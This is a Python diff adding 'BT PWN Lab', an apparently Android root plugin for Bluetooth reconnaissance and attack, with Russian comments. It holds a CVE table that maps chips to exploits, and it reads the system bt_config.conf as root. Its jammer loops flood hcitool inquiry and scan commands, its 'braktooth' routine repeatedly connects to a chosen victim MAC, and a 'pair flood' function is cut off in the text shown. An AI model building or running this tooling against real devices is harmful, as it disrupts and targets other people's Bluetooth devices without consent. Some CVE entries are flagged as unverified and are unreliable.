@@ -1,0 +1,2047 @@
+# ============================================================================
+#  BT PWN Lab — Dolphy plugin
+#  id: bt_pwn_lab | v4.3 | Venice | section BLUETOOTH
+#  ---------------------------------------------------------------------------
+#  БАЗА v3.2 СОХРАНЕНА 1:1. НИЧЕГО существующего не менялось — только добавки.
+#  v4.0 bridge вместо su · v4.1 тулзы/Root Lab/stack-вектор/терминал/+6 CVE
+#  v4.2 фикс сканера (батч-колбэк, изоляция ошибок, _fp_model)
+#  v4.3 ИМЕНА:
+#    · имя читается из всех вариантов ключа (name/deviceName/localName/…)
+#    · имя больше НЕ стирается при обновлении пакета (мерж записи)
+#    · известные имена подтягиваются из спаренных устройств и bt_config.conf
+#    · кнопка «Прочитать имя» (GATT DIS 0x180A / Device Name 0x2A00)
+#    · автоподтягивание имени при открытии карточки устройства
+#    · фильтр «Имена»
+# ============================================================================
+import json
+import time
+import random
+import threading
+import subprocess
+
+__id__          = "bt_pwn_lab"
+__name__        = "BT PWN Lab"
+__version__     = "4.3"
+__author__      = "Venice"
+__description__ = "BLE-разведка, WhisperPair, RACE, Jammer MAX, root lab (A13), база CVE BT"
+__icon__        = "rounded:bluetooth_searching"
+__permissions__ = ["bluetooth", "root", "shell"]
+
+
+# ============================================================================
+#  OUI / чипы  (v3.2, без правок)
+# ============================================================================
+OUI = {
+    "A4C138": "Telink/Xiaomi", "001A79": "Huawei", "240AC4": "Espressif",
+    "30AEA4": "Espressif", "3C71BF": "Espressif", "7CDFA1": "Espressif",
+    "84F3EB": "Espressif", "8CAAB5": "Espressif", "A4CF12": "Espressif",
+    "AC67B2": "Espressif", "B4E62D": "Espressif", "C44F33": "Espressif",
+    "CC50E3": "Espressif", "D8A01D": "Espressif", "DC4F22": "Espressif",
+    "ECFABC": "Espressif", "F4CFA2": "Espressif", "246F28": "Espressif",
+    "24B2DE": "Espressif", "0059AC": "Nordic", "C0B209": "Nordic",
+    "E98D8C": "Nordic", "F4CE36": "Nordic", "B827EB": "Raspberry Pi",
+    "DCA632": "Raspberry Pi", "E45F01": "Raspberry Pi", "2CCF67": "Raspberry Pi",
+    "98EB6C": "Samsung", "0012FB": "Samsung", "0026BB": "Apple",
+    "3C5AB4": "Google", "F4F5D8": "Google", "94EB2C": "Google",
+}
+
+CHIP_HINTS = {
+    "jieli":    {"oui": ["A4C138"],
+                 "names": ["jl_", "ac69", "ac63", "bt speaker", "s2", "f1", "k1", "mini"],
+                 "uuids": ["0000fe07", "0000ff00", "0000ffe0"],
+                 "note": "Zhuhai JieLi AC69xx/AC63xx"},
+    "bluetrum": {"oui": [], "names": ["ab53", "bt speaker", "bluetrum"],
+                 "uuids": ["0000ff00"], "note": "Bluetrum AB53xx"},
+    "airoha":   {"oui": [], "names": ["airoha"],
+                 "uuids": ["5052494d2dab034169726f6861424c45",
+                           "dc405470a3514a5997d82e2e3b207fbb"],
+                 "note": "Airoha RACE (CVE-2025-2070x)"},
+    "telink":   {"oui": ["A4C138"], "names": ["telink", "tlsr"], "uuids": [],
+                 "note": "Telink TLSR — SweynTooth"},
+    "espressif": {"oui": ["240AC4", "30AEA4", "3C71BF", "7CDFA1", "84F3EB",
+                          "8CAAB5", "A4CF12", "AC67B2", "B4E62D", "C44F33"],
+                  "names": ["esp32", "esp_"], "uuids": [],
+                  "note": "Espressif ESP32 — BrakTooth V1"},
+    "fastpair": {"oui": ["F4F5D8", "94EB2C", "3C5AB4"],
+                 "names": ["buds", "fast pair", "pixel", "jbl", "soundcore",
+                           "anker", "sony wh", "wf-", "wh-", "nothing"],
+                 "uuids": ["0000fe2c", "fe2c"],
+                 "note": "Google Fast Pair — WhisperPair (CVE-2025-36911)"},
+}
+
+RACE_BLE_UUIDS = ["5052494d2dab034169726f6861424c45",
+                  "dc405470a3514a5997d82e2e3b207fbb"]
+
+FP_SERVICE = "0000fe2c-0000-1000-8000-00805f9b34fb"
+FP_MODEL   = "fe2c1233-8366-4814-8eb0-01de32100bea"
+FP_KBP     = "fe2c1234-8366-4814-8eb0-01de32100bea"
+FP_PASSKEY = "fe2c1235-8366-4814-8eb0-01de32100bea"
+FP_ACCOUNT = "fe2c1236-8366-4814-8eb0-01de32100bea"
+
+# v4.3: Device Information Service — отсюда тянем настоящее имя
+DIS_SERVICE = "0000180a-0000-1000-8000-00805f9b34fb"
+DIS_NAME    = "00002a00-0000-1000-8000-00805f9b34fb"
+DIS_MODEL   = "00002a24-0000-1000-8000-00805f9b34fb"
+DIS_MANUF   = "00002a29-0000-1000-8000-00805f9b34fb"
+
+
+# ============================================================================
+#  VULNDB  (первые 17 — исходные v3.2)
+# ============================================================================
+VULNDB = [
+    ("CVE-2021-34144", "BrakTooth", "V2", 6.5, "Truncated SCO Link Request",
+     ["jieli"], "deadlock", "inq"),
+    ("CVE-2021-31613", "BrakTooth", "V8", 6.5, "Truncated LMP Accepted",
+     ["jieli"], "crash", "inq"),
+    ("CVE-2021-31611", "BrakTooth", "V9", 6.5, "Invalid Setup Complete",
+     ["jieli"], "deadlock", "conn"),
+    ("CVE-2021-31609", "BrakTooth", "V5", 7.5, "LMP Auto Rate Overflow",
+     ["jieli"], "crash", "inq"),
+    ("CVE-2021-34150", "BrakTooth", "V7", 6.5, "LMP DM1 Overflow",
+     ["bluetrum"], "deadlock", "inq"),
+    ("CVE-2021-31610", "BrakTooth", "V12", 7.5, "AU Rand Flooding",
+     ["bluetrum", "jieli"], "crash/deadlock", "inq"),
+    ("CVE-2021-28135", "BrakTooth", "V4", 7.5, "Feature Response Flooding",
+     ["jieli", "espressif", "unknown"], "crash", "inq"),
+    ("CVE-2021-28139", "BrakTooth", "V1", 8.1, "Feature Pages Execution",
+     ["espressif"], "ACE/deadlock", "inq"),
+    ("CVE-2025-20700", "Airoha RACE", "1", 7.1, "Missing Auth for GATT",
+     ["airoha"], "silent connect", "race"),
+    ("CVE-2025-20701", "Airoha RACE", "2", 8.8, "Missing Auth for BR/EDR",
+     ["airoha"], "silent connect", "race"),
+    ("CVE-2025-20702", "Airoha RACE", "3", 8.8, "RACE R/W RAM+Flash",
+     ["airoha"], "dump/ACE", "race"),
+    ("CVE-2019-16336", "SweynTooth", "LLID", 6.1, "Link Layer LLID Deadlock",
+     ["telink"], "deadlock", "conn"),
+    ("CVE-2019-19194", "SweynTooth", "ZeroLTK", 6.1, "Zero LTK Installation",
+     ["telink"], "обход шифрования", "conn"),
+    ("CVE-2019-9506", "KNOB", "1", 8.1, "Key Negotiation of Bluetooth",
+     ["*"], "ключ 1 байт", "knob"),
+    ("CVE-2023-24023", "BLUFFS", "1", 6.8, "Forced Short Key",
+     ["*"], "AiTM", "knob"),
+    ("CVE-2020-9770", "BLESA", "1", 6.5, "BLE Reconnection Spoofing",
+     ["*"], "спуфинг", "conn"),
+    ("CVE-2023-45866", "HID Injection", "1", 7.1, "Unauthenticated HID Injection",
+     ["*"], "инъекция нажатий", "-"),
+
+    # ---------------- BrakTooth, добор ----------------
+    ("CVE-2021-31612", "BrakTooth", "V3", 6.5, "LMP Cold CCE",
+     ["jieli", "bluetrum", "espressif"], "crash/deadlock", "inq"),
+    ("CVE-2021-34145", "BrakTooth", "V10", 7.5, "LMP Accepted Flood",
+     ["jieli"], "crash", "inq"),
+    ("CVE-2021-34146", "BrakTooth", "V11", 7.5, "LMP DM1 Overflow",
+     ["jieli"], "deadlock", "inq"),
+    ("CVE-2021-34147", "BrakTooth", "V13", 7.5, "AU Rand Flooding",
+     ["bluetrum"], "crash", "inq"),
+    ("CVE-2021-34148", "BrakTooth", "V14", 6.5, "Truncated LMP Accepted",
+     ["bluetrum"], "crash", "inq"),
+    ("CVE-2021-34149", "BrakTooth", "V15", 7.5, "Invalid Max Slot",
+     ["jieli"], "deadlock", "conn"),
+    ("CVE-2021-34151", "BrakTooth", "V17", 7.5, "Feature Request Flood",
+     ["espressif", "unknown"], "crash", "inq"),
+    ("CVE-2021-28155", "BrakTooth", "V16", 7.5, "Duplicate Feature Request",
+     ["espressif"], "deadlock", "inq"),
+    ("CVE-2021-28156", "BrakTooth", "V6", 6.5, "LMP Accepted Overflow",
+     ["espressif"], "crash", "conn"),
+    # ---------------- SweynTooth, добор ----------------
+    ("CVE-2019-17517", "SweynTooth", "ZeroLTK-S", 6.1, "Zero LTK (Samsung)",
+     ["unknown"], "обход шифрования", "conn"),
+    ("CVE-2019-17518", "SweynTooth", "LLID-NXP", 6.1, "LLID Deadlock (NXP)",
+     ["unknown"], "deadlock", "conn"),
+    ("CVE-2019-17519", "SweynTooth", "L2CAP", 6.1, "Truncated L2CAP (Cypress)",
+     ["unknown"], "crash", "conn"),
+    ("CVE-2019-17520", "SweynTooth", "ATT", 6.1, "Sequential ATT Deadlock",
+     ["unknown"], "deadlock", "conn"),
+    ("CVE-2019-19195", "SweynTooth", "KeySize", 6.1, "Key Size Bypass (Cypress)",
+     ["unknown"], "обход шифрования", "conn"),
+    ("CVE-2019-19196", "SweynTooth", "KeySize", 6.1, "Key Size Bypass (NXP)",
+     ["unknown"], "обход шифрования", "conn"),
+    ("CVE-2019-19197", "SweynTooth", "KeySize", 6.1, "Key Size Bypass (TI)",
+     ["unknown"], "обход шифрования", "conn"),
+    ("CVE-2019-19198", "SweynTooth", "KeySize", 6.1, "Key Size Bypass (Dialog)",
+     ["unknown"], "обход шифрования", "conn"),
+    # ---------------- классика / стек ----------------
+    ("CVE-2017-0781", "BlueBorne", "BNEP", 8.8, "BNEP Heap Overflow",
+     ["*"], "RCE", "-"),
+    ("CVE-2017-0782", "BlueBorne", "BNEP", 8.8, "BNEP RCE/утечка",
+     ["*"], "RCE", "-"),
+    ("CVE-2017-0783", "BlueBorne", "PAN", 8.1, "PAN Profile RCE",
+     ["*"], "RCE", "-"),
+    ("CVE-2017-0785", "BlueBorne", "SDP", 5.3, "SDP Info Leak",
+     ["*"], "утечка памяти", "-"),
+    ("CVE-2018-5383", "Invalid Curve", "1", 7.1, "ECDH Invalid Curve",
+     ["*"], "обход шифрования", "knob"),
+    ("CVE-2020-15802", "BLURtooth", "1", 6.5, "Cross-transport key overwrite",
+     ["*"], "AiTM", "knob"),
+    ("CVE-2020-12351", "BleedingTooth", "1", 8.3, "L2CAP A2MP Heap OOB",
+     ["*"], "RCE (Linux)", "-"),
+    ("CVE-2020-12352", "BleedingTooth", "2", 6.5, "A2MP Info Leak",
+     ["*"], "утечка ядра", "-"),
+    ("CVE-2020-24490", "BleedingTooth", "3", 6.5, "BLE Adv Buffer Overflow",
+     ["*"], "DoS (Linux)", "conn"),
+    ("CVE-2020-0022", "BlueFrag", "1", 7.8, "Android BLE OOB Write",
+     ["*"], "RCE (Android 8/9)", "conn"),
+    ("CVE-2022-25836", "Legacy Pairing", "1", 6.5, "LE Legacy brute-force",
+     ["*"], "перехват ключа", "knob"),
+    ("CVE-2022-25837", "Legacy Pairing", "2", 6.5, "LE Legacy downgrade",
+     ["*"], "перехват ключа", "knob"),
+    ("CVE-2024-0230", "HID Injection", "2", 6.5, "Apple pairing key extraction",
+     ["*"], "инъекция нажатий", "-"),
+    ("CVE-2024-21306", "HID Injection", "3", 5.7, "Windows BT HID spoofing",
+     ["*"], "инъекция нажатий", "-"),
+    ("CVE-2024-23694", "Android LE Audio", "1", 7.8, "LE Audio Use-After-Free",
+     ["*"], "RCE (Android 14)", "conn"),
+    ("CVE-2024-45431", "PerfektBlue", "1", 8.8, "BlueSDK pairing bypass",
+     ["*"], "RCE (авто)", "knob"),
+    ("CVE-2024-45432", "PerfektBlue", "2", 8.8, "BlueSDK SDP RCE",
+     ["*"], "RCE (авто)", "-"),
+    ("CVE-2024-45433", "PerfektBlue", "3", 7.5, "BlueSDK DoS",
+     ["*"], "DoS (авто)", "-"),
+    ("CVE-2024-45434", "PerfektBlue", "4", 8.8, "BlueSDK info leak",
+     ["*"], "утечка", "-"),
+    ("CVE-2025-36911", "WhisperPair", "FastPair", 9.1, "Fast Pair forced pairing",
+     ["fastpair", "jieli", "airoha", "bluetrum"],
+     "тихое сопряжение · микрофон · трекинг через Find Hub", "fp"),
+    # ---------------- v4.1: Android BT-стек (A13) ----------------
+    ("CVE-2023-40087", "Android BT", "AVRCP", 7.8,
+     "btif_avrcp_audio_track OOB write", ["*"], "EoP от paired-устройства", "-"),
+    ("CVE-2024-0045", "Android BT", "SMP", 7.5,
+     "smp_proc_sec_req OOB read", ["*"], "утечка (proximal)", "conn"),
+    ("CVE-2024-0016", "Android BT", "Core", 6.5,
+     "OOB read: раскрытие paired data", ["*"], "утечка данных", "conn"),
+    ("CVE-2023-40090", "Android BT", "Core", 7.8,
+     "Core stack OOB (семейство AVRCP)", ["*"], "EoP", "-"),
+    ("CVE-2023-21273", "Android BT", "Stack", 8.8,
+     "Use-after-free в BT-стеке", ["*"], "EoP", "-"),
+    ("CVE-2023-35672", "Android BT", "Stack", 7.8,
+     "OOB write в BT-стеке (уточнить)", ["*"], "EoP", "-"),
+]
+
+
+def _vendor(mac):
+    if not mac:
+        return "?"
+    return OUI.get(mac.replace(":", "").upper()[:6], "Unknown")
+
+
+def _vulns_for(chip):
+    return [v for v in VULNDB if "*" in v[5] or chip in v[5]]
+
+
+def _chip_of(name, mac, uuids):
+    n = (name or "").lower()
+    m = (mac or "").replace(":", "").upper()
+    us = [str(u).replace("-", "").lower() for u in (uuids or [])]
+    best, score = None, 0
+    for chip, sig in CHIP_HINTS.items():
+        sc = 0
+        for o in sig["oui"]:
+            if m.startswith(o):
+                sc += 3
+        for k in sig["names"]:
+            if k in n:
+                sc += 2
+        for u in sig["uuids"]:
+            if any(u in x or x in u for x in us):
+                sc += 5
+        if sc > score:
+            best, score = chip, sc
+    return best or "unknown"
+
+
+def _rssi_label(r):
+    r = int(r)
+    if r >= -55:
+        return "Отличный"
+    if r >= -70:
+        return "Хороший"
+    if r >= -85:
+        return "Слабый"
+    return "Очень слабый"
+
+
+def _fp_model(d):
+    sd = d.get("serviceData") or d.get("service_data") or {}
+    items = []
+    if isinstance(sd, dict):
+        items = list(sd.items())
+    elif isinstance(sd, list):
+        for e in sd:
+            if isinstance(e, dict):
+                items.append((e.get("uuid") or e.get("key"),
+                              e.get("data") or e.get("value")))
+            elif isinstance(e, (list, tuple)) and len(e) >= 2:
+                items.append((e[0], e[1]))
+    for u, v in items:
+        us = str(u).replace("-", "").replace(":", "").lower()
+        if "fe2c" in us:
+            hx = str(v).replace(":", "").replace("-", "").replace(" ", "").upper()
+            if len(hx) >= 6:
+                return hx[:6]
+    return None
+
+
+# ---------------------------------------------------------------- v4.3: имена
+NAME_KEYS = ("name", "deviceName", "localName", "btName", "Name",
+             "device_name", "local_name", "advertisedName")
+
+
+def _pick_name(d):
+    """Имя из любого варианта ключа, включая вложенный scanRecord."""
+    if not isinstance(d, dict):
+        return None
+    for k in NAME_KEYS:
+        v = d.get(k)
+        if isinstance(v, str) and v.strip():
+            return v.strip()
+    for sk in ("scanRecord", "scan_record", "record"):
+        sr = d.get(sk)
+        if isinstance(sr, dict):
+            for k in ("deviceName", "localName", "name"):
+                v = sr.get(k)
+                if isinstance(v, str) and v.strip():
+                    return v.strip()
+    return None
+
+
+def _hex_to_ascii(hx):
+    try:
+        raw = str(hx).replace(":", "").replace("-", "").replace(" ", "")
+        b = bytes.fromhex(raw)
+        s = b.decode("utf-8", "ignore").replace("\x00", "")
+        return "".join(ch for ch in s if ch.isprintable()).strip()
+    except Exception:
+        return ""
+
+
+def _dev_label(d):
+    nm = _pick_name(d)
+    if nm:
+        return nm
+    return "без имени · %s" % (d.get("vendor") or "?")
+
+
+# ============================================================================
+#  ВЫПОЛНЕНИЕ: Dolphy bridge
+# ============================================================================
+_EXEC = None
+
+
+def _fmt(res):
+    if res is None:
+        return ""
+    s = res if isinstance(res, str) else str(res)
+    t = s.strip()
+    if t.startswith("{") and '"ok"' in t:
+        try:
+            d = json.loads(t)
+            out = (d.get("out") or "") + (d.get("err") or "")
+            if not out and not d.get("ok"):
+                out = "exit=%s" % d.get("code")
+            return out.strip()
+        except Exception:
+            pass
+    return s
+
+
+def _sh(cmd, root=True, timeout=12):
+    if _EXEC is not None:
+        try:
+            return _EXEC(cmd, root)
+        except Exception as e:
+            return "ERR: %s" % e
+    full = ("su -c '%s'" % cmd.replace("'", "'\\''")) if root else cmd
+    try:
+        p = subprocess.run(full, shell=True, capture_output=True, timeout=timeout)
+        return (p.stdout or b"").decode("utf-8", "replace") + \
+               (p.stderr or b"").decode("utf-8", "replace")
+    except Exception as e:
+        return "ERR: %s" % e
+
+
+def _has_root():
+    try:
+        return "uid=0" in _sh("id")
+    except Exception:
+        return False
+
+
+# ============================================================================
+#  автопоиск BlueZ-тулз (в т.ч. Magisk-модули вида Bluetooth++)
+# ============================================================================
+TOOL_NAMES = ["hcitool", "hciconfig", "btmgmt", "bluetoothctl",
+              "hcidump", "btmon", "hciattach"]
+_TOOLS = {}
+_TOOLS_PROBED = False
+
+
+def _probe_tools(force=False):
+    global _TOOLS_PROBED
+    if _TOOLS_PROBED and not force:
+        return _TOOLS
+    _TOOLS_PROBED = True
+    _TOOLS.clear()
+    for n in TOOL_NAMES:
+        cmd = ("command -v %s 2>/dev/null "
+               "|| ls /data/adb/modules/*/system/bin/%s 2>/dev/null | head -1 "
+               "|| ls /data/adb/modules/*/system/xbin/%s 2>/dev/null | head -1 "
+               "|| ls /data/local/tmp/%s 2>/dev/null | head -1 "
+               "|| ls /system/xbin/%s 2>/dev/null | head -1" %
+               (n, n, n, n, n))
+        out = _sh(cmd, True).strip()
+        first = out.splitlines()[0].strip() if out else ""
+        if first and "No such" not in first and "not found" not in first:
+            _TOOLS[n] = first
+    return _TOOLS
+
+
+def _tool(name):
+    return _probe_tools().get(name) or name
+
+
+def _have_bt_tools():
+    t = _probe_tools()
+    return bool(t.get("hcitool") or t.get("btmgmt") or t.get("bluetoothctl"))
+
+
+# ============================================================================
+#  ПЛАГИН
+# ============================================================================
+class BtPwnLab(BasePlugin):
+
+    def __init__(self):
+        super().__init__()
+        self.scanning = False
+        self.devices = {}
+        self.selected = None
+        self.filter = "all"
+        self.status = "Готов"
+        self.log_lines = []
+        self.vuln_results = []
+        self.jam_mode = "lescan"
+        self.jam_proc = None
+        self.jam_running = False
+        self.keys_rows = []
+        self._last_refresh = 0.0
+        self._last_err = 0.0
+        self.root_ok = False
+        self.term_cmd = ""
+        self.term_lines = []
+        self.term_root = True
+        self.max_running = False
+        self.intensity = 8
+        self.delay = 0.25
+        self.target_mode = "selected"
+        self.vec = {"rfcomm": True, "bond": True, "sdp": True, "inq": True,
+                    "gatt": True, "name": False, "ble": False, "root": True,
+                    "stack": False}
+        self.stats = {}
+        self.workers = []
+        self._tick = None
+        self.whisper_log = []
+        self.race_log = []
+        self.race_rows = []
+        self.lab_log = []
+        self.tools = {}
+        # v4.3
+        self.known_names = {}
+        self.name_tried = set()
+        self.name_log = []
+
+    # ------------------------------------------------------------ lifecycle
+    def on_plugin_load(self):
+        global _EXEC
+        _EXEC = self._exec
+        try:
+            self.root_ok = bool(self.api.getDevice().rootAvailable())
+        except Exception:
+            self.root_ok = _has_root()
+        self.log("Загружено. root=%s" % self.root_ok)
+        self.add_module(
+            "BT PWN Lab",
+            "BLE-разведка, джеммер, link keys, уязвимости BT-аудио",
+            "bluetooth_searching",
+            "main",
+            "BLUETOOTH",
+            12,
+        )
+        threading.Thread(target=self._probe_tools_async, daemon=True).start()
+        threading.Thread(target=self._refresh_known_names, daemon=True).start()
+        try:
+            self.hook_screen("bluetooth_whisperpair", "whisper_panel", "bottom", 60)
+            self.hook_screen("other/bluetooth_whisperpair", "whisper_panel", "bottom", 60)
+            self.hook_screen("other/bluetooth_jammer", "jam_fab", "fab", 60)
+        except Exception as e:
+            self.log("hook err: %s" % e)
+
+    def _probe_tools_async(self):
+        try:
+            if not self.root_ok:
+                return
+            self.tools = _probe_tools(True)
+            if self.tools:
+                self.log("Тулзы: " + ", ".join(sorted(self.tools.keys())))
+        except Exception as e:
+            self.log("tools err: %s" % e)
+
+    def on_plugin_unload(self):
+        try:
+            if self.scanning:
+                self.api.bleStopScan(__id__)
+        except Exception:
+            pass
+        self.max_running = False
+        self.jam_stop()
+        try:
+            a = self.api.getAndroid()
+            a.btStopDiscovery()
+            a.bleAdvertiseStop()
+        except Exception:
+            pass
+
+    # ------------------------------------------------------------- exec
+    def _exec(self, cmd, root=True):
+        raw = None
+        if root and self.root_ok:
+            try:
+                raw = self.root(cmd)
+            except Exception:
+                raw = None
+        if raw is None or (isinstance(raw, str) and not raw.strip()):
+            try:
+                raw = self.shell(cmd)
+            except Exception as e:
+                return "ERR: %s" % e
+        return _fmt(raw)
+
+    def log(self, msg):
+        line = "%s  %s" % (time.strftime("%H:%M:%S"), msg)
+        self.log_lines.append(line)
+        if len(self.log_lines) > 400:
+            self.log_lines = self.log_lines[-400:]
+
+    def _err(self, msg):
+        now = time.monotonic()
+        if now - self._last_err >= 2.0:
+            self._last_err = now
+            self.log("scan err: %s" % msg)
+
+    def llog(self, msg):
+        line = "%s  %s" % (time.strftime("%H:%M:%S"), msg)
+        self.lab_log.append(line)
+        if len(self.lab_log) > 300:
+            self.lab_log = self.lab_log[-300:]
+        self.log("LAB: " + msg)
+
+    # ---------------------------------------------------------------- v4.3
+    def _refresh_known_names(self):
+        """Имена из спаренных устройств и bt_config.conf — без коннекта."""
+        m = {}
+        try:
+            data = json.loads(str(self.api.getAndroid().btBondedDevicesJson()))
+            items = data.get("devices") if isinstance(data, dict) else data
+            for e in (items or []):
+                if isinstance(e, dict) and e.get("address"):
+                    nm = _pick_name(e)
+                    if nm:
+                        m[str(e["address"]).upper()] = nm
+        except Exception:
+            pass
+        for path in ("/data/misc/bluetooth/bt_config.conf",
+                     "/data/misc/bluedroid/bt_config.conf"):
+            try:
+                raw = _sh("cat %s" % path)
+                if "ERR" in raw or "No such" in raw:
+                    continue
+                cur = None
+                for line in raw.splitlines():
+                    s = line.strip()
+                    if s.startswith("[") and s.endswith("]"):
+                        cur = s[1:-1].upper()
+                    elif cur and s.split("=")[0].strip() == "Name":
+                        v = s.split("=", 1)[1].strip()
+                        if v:
+                            m[cur] = v
+            except Exception:
+                pass
+        if m:
+            self.known_names.update(m)
+        self.log("Известных имён: %d" % len(self.known_names))
+        # подставить уже найденным устройствам
+        for mac, d in list(self.devices.items()):
+            if not _pick_name(d) and self.known_names.get(mac):
+                d["name"] = self.known_names[mac]
+        self.refresh()
+
+    def _set_name(self, mac, name, src="gatt"):
+        mac = str(mac).upper()
+        if not name:
+            return
+        d = self.devices.get(mac)
+        if d is None and self.selected and self.selected.get("address") == mac:
+            d = self.selected
+        if d is None:
+            return
+        if not _pick_name(d):
+            d["name"] = name
+            line = "%s  %s <- %s (%s)" % (time.strftime("%H:%M:%S"), mac, name, src)
+            self.name_log.append(line)
+            if len(self.name_log) > 100:
+                self.name_log = self.name_log[-100:]
+            self.log("Имя: %s = %s (%s)" % (mac, name, src))
+            self.refresh()
+
+    def read_name(self):
+        mac = (self.selected or {}).get("address")
+        if not mac:
+            return
+        self.name_tried.add(mac)
+        threading.Thread(target=self._read_name_worker, args=(mac,), daemon=True).start()
+
+    def _read_name_worker(self, mac):
+        dev = self.api.getAndroid()
+        self.log("Читаю имя: %s" % mac)
+        try:
+            dev.gattConnect(mac, self.on_gatt_event)
+            time.sleep(2.0)
+            for ch in (DIS_NAME, DIS_MODEL, DIS_MANUF):
+                try:
+                    dev.gattRead(mac, DIS_SERVICE, ch)
+                except Exception:
+                    pass
+                time.sleep(0.8)
+            try:
+                info = json.loads(str(dev.btDeviceInfoJson(mac)))
+                nm = _pick_name(info) if isinstance(info, dict) else None
+                if nm:
+                    self._set_name(mac, nm, "android-cache")
+            except Exception:
+                pass
+            time.sleep(0.5)
+            dev.gattDisconnect(mac)
+        except Exception as e:
+            self.log("read_name err: %s" % e)
+        if not _pick_name(self.devices.get(mac, {})):
+            self.log("Имя не отдано: %s (нет DIS или устройство молчит)" % mac)
+        self.refresh()
+
+    # ----------------------------------------------------------------- scan
+    def toggle_scan(self):
+        if self.scanning:
+            try:
+                self.api.bleStopScan(__id__)
+            except Exception:
+                pass
+            self.scanning = False
+            self.status = "Скан остановлен · %d устройств" % len(self.devices)
+            self.log("Скан остановлен")
+        else:
+            self.devices = {}
+            threading.Thread(target=self._refresh_known_names, daemon=True).start()
+            try:
+                self.scanning = bool(self.api.bleStartScan(__id__, self.on_device, 300, 128))
+            except Exception as e:
+                self.scanning = False
+                self.log("bleStartScan err: %s" % e)
+            self.status = "Скан идёт…" if self.scanning else "Скан не стартовал (проверь BT и права)"
+            self.log(self.status)
+        self.refresh()
+
+    def on_device(self, payload):
+        try:
+            data = json.loads(str(payload))
+        except Exception as e:
+            self._err("json: %s" % e)
+            return
+        if isinstance(data, dict) and isinstance(data.get("devices"), list):
+            items = data["devices"]
+        elif isinstance(data, list):
+            items = data
+        else:
+            items = [data]
+        for d in items:
+            if isinstance(d, dict):
+                try:
+                    self._add_device(d)
+                except Exception as e:
+                    self._err("dev: %s" % e)
+        now = time.monotonic()
+        if now - self._last_refresh >= 0.4:
+            self._last_refresh = now
+            self.refresh()
+
+    def _add_device(self, d):
+        mac = d.get("address") or d.get("mac") or d.get("Address")
+        if not mac:
+            return
+        mac = str(mac).upper()
+        prev = self.devices.get(mac)
+        if prev:
+            # v4.3: не терять имя и полезные поля при обновлении пакета
+            if not _pick_name(d) and _pick_name(prev):
+                d["name"] = _pick_name(prev)
+            for k in ("fpModel", "chip", "vendor", "model", "manuf"):
+                if not d.get(k) and prev.get(k):
+                    d[k] = prev[k]
+        nm = _pick_name(d) or self.known_names.get(mac)
+        if nm:
+            d["name"] = nm
+        uuids = d.get("serviceUuids") or d.get("uuids") or []
+        d["address"] = mac
+        d["vendor"] = _vendor(mac)
+        d["chip"] = _chip_of(d.get("name"), mac, uuids)
+        d["race"] = any(str(u).replace("-", "").lower() in RACE_BLE_UUIDS
+                        for u in uuids)
+        d["fpModel"] = _fp_model(d)
+        d["fp"] = bool(d["fpModel"]) or any(
+            "fe2c" in str(u).replace("-", "").lower() for u in uuids)
+        if d["fp"] and d["chip"] == "unknown":
+            d["chip"] = "fastpair"
+        d["vulns"] = _vulns_for(d["chip"])
+        d["hasName"] = bool(_pick_name(d))
+        d["last"] = time.time()
+        self.devices[mac] = d
+
+    def set_filter(self, value):
+        self.filter = str(value)
+        self.refresh()
+
+    def visible(self):
+        items = list(self.devices.values())
+        if self.filter == "named":
+            items = [d for d in items if _pick_name(d)]
+        elif self.filter == "vuln":
+            items = [d for d in items if d.get("vulns")]
+        elif self.filter == "race":
+            items = [d for d in items if d.get("race")]
+        elif self.filter == "fp":
+            items = [d for d in items if d.get("fp")]
+        return sorted(items, key=lambda x: int(x.get("rssi", -127)), reverse=True)
+
+    def open_device(self, d):
+        self.selected = d
+        self.navigate("details")
+        # v4.3: автоподтягивание имени
+        if (not _pick_name(d) and d.get("connectable")
+                and d.get("address") not in self.name_tried):
+            self.read_name()
+
+    def cb_device(self, d):
+        return lambda: self.open_device(d)
+
+    # ---------------------------------------------------------------- vuln
+    def assess_all(self):
+        self.vuln_results = []
+        for d in self.devices.values():
+            for v in d.get("vulns", []):
+                cve, fam, ver, cvss, name, chips, impact, probe = v
+                if d.get("race") and probe == "race":
+                    st = "RACE в эфире"
+                elif d.get("fp") and probe == "fp":
+                    st = "Fast Pair в эфире"
+                elif d.get("chip") in chips:
+                    st = "ПОДОЗРЕВАЕМ"
+                elif "*" in chips:
+                    st = "протокольная"
+                else:
+                    st = "инфо"
+                self.vuln_results.append({
+                    "mac": d.get("address"), "name": _dev_label(d),
+                    "cve": cve, "fam": fam, "name2": name, "cvss": cvss,
+                    "status": st, "impact": impact, "probe": probe,
+                })
+        self.vuln_results.sort(key=lambda x: -x["cvss"])
+        self.log("Оценка: %d записей" % len(self.vuln_results))
+        self.refresh()
+
+    # -------------------------------------------------------------- jammer
+    JAM = {
+        "lescan":   "hcitool -i hci0 lescan --duplicates",
+        "inq":      "hcitool -i hci0 inq --length 8",
+        "inq_fast": "hcitool -i hci0 inq --length 1",
+        "feature":  "hcitool -i hci0 inq --length 4",
+        "classic":  "hcitool -i hci0 inq",
+        "iscan":    "hciconfig hci0 iscan",
+        "pscan":    "hciconfig hci0 pscan",
+        "reset":    "hciconfig hci0 reset",
+    }
+
+    def set_jam_mode(self, mode):
+        self.jam_mode = str(mode)
+        self.refresh()
+
+    def _jam_cmd(self):
+        c = self.JAM.get(self.jam_mode, self.JAM["lescan"])
+        return c.replace("hcitool", _tool("hcitool")).replace("hciconfig", _tool("hciconfig"))
+
+    def jam_start(self):
+        if not self.root_ok:
+            self.log("Джеммеру нужен root")
+            return
+        if self.jam_running:
+            return
+        self.jam_running = True
+        threading.Thread(target=self._jam_worker, args=(self._jam_cmd(),), daemon=True).start()
+        self.log("JAM старт: %s" % self.jam_mode)
+        self.refresh()
+
+    def _jam_worker(self, cmd):
+        while self.jam_running:
+            self._exec(cmd, True)
+
+    def jam_stop(self):
+        self.jam_running = False
+        self._exec("pkill -f hcitool; pkill -f hciconfig; pkill -f btmgmt", True)
+        self.log("JAM стоп")
+
+    def braktooth(self, kind):
+        mac = (self.selected or {}).get("address")
+        if not mac:
+            return
+        if not self.root_ok:
+            self.log("BrakTooth: нужен root")
+            return
+        hci = _tool("hcitool")
+        cmd = ("%s -i hci0 cc %s" % (hci, mac)) if kind == "conn" else \
+              ("%s -i hci0 inq --length 8" % hci)
+        self.jam_running = True
+        threading.Thread(target=self._jam_worker, args=(cmd,), daemon=True).start()
+        self.log("BrakTooth %s -> %s" % (kind, mac))
+        self.refresh()
+
+    def pair_flood(self):
+        mac = (self.selected or {}).get("address")
+        if not mac:
+            return
+        self.log("Pair flood -> %s" % mac)
